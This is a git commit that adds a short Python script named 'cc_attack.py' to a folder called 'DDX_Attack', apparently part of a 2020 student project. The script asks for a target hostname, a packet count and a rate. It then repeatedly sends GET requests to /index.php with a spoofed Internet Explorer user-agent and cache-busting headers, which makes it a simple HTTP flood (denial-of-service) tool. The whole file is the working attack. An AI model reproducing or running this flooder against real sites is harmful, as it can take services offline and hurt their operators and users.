15ca951fa9e8c233b0af72d1ee0e71b1624960ef
4lugin <34256041+4lugin@users.noreply.github.com>
2020-06-19 17:08:14 +0900

    Create 1. cc_attack.py

---
+++ 2020_Project/4. DDX_Attack/1. cc_attack.py
@@ -0,0 +1,51 @@
+#-*- coding: utf-8 -*-
+﻿# platform : Windows 7
+# Language : Python 3.6
+
+
+import threading
+import urllib
+import time, http.client
+
+
+sleepTime = 1
+hostname = input(">> hostname? (ex. http://test.com): ")
+cNum = int(input(">> Total Send Packet?: "))
+sleepTime = int(input(">> Send Packet Count Per Second: "))
+
+
+start = time.time()
+params = []
+params = urllib.parse.urlencode(params)
+headers = {
+    "Content-type": "application/x-www-form-urlencoded",
+    "Accept": "text/plain",
+    "User-agent": "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.3; Trident/7.0; .NET4.0E; .NET4.0C)",
+    "Cache-Control": "no-cache, must-revalidate"
+}
+
+count = 1
+def fetch_url(url):
+    global count
+    try:
+        conn = http.client.HTTPConnection(url,timeout=1/sleepTime)
+        conn.request("GET", "/index.php", params, headers)
+        time.sleep(1/sleepTime)
+        conn.close()
+        print ("\n"+time.strftime('%Y/%m/%d %H:%M:%S', time.localtime()))
+        print ("Packet Count:",count,"(Connect Success!!)")
+        count = count +1
+
+    except:
+        print ("\n"+time.strftime('%Y/%m/%d %H:%M:%S', time.localtime()))
+        print ("Packet Count:",count,"(Not Connect)")
+        count = count +1
+
+
+n=1
+while (n < cNum+1):
+    fetch_url(hostname)
+    n=n+1
+
+
+print ("\nRunning Time: %s" % (time.time() - start))
